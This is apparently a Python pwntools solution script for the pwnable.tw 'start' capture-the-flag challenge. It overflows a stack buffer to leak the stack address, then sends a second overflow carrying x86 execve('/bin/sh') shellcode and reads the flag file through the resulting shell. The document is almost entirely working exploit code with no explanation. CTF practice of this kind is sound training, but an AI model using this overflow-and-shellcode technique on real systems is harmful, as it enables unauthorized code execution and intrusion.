# pwnable.tw: start
# woanmeo11

from pwn import *

r = remote('chall.pwnable.tw', 10000)
r.recv()

payload = b'a'*0x14 + p32(0x08048087)
r.send(payload)

esp_addr = u32(r.recv()[:4])
shellcode = b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

payload = b'a'*0x14 + p32(esp_addr + 20) + shellcode 

r.send(payload)
r.sendline('cat /home/start/flag')

print(r.recv())
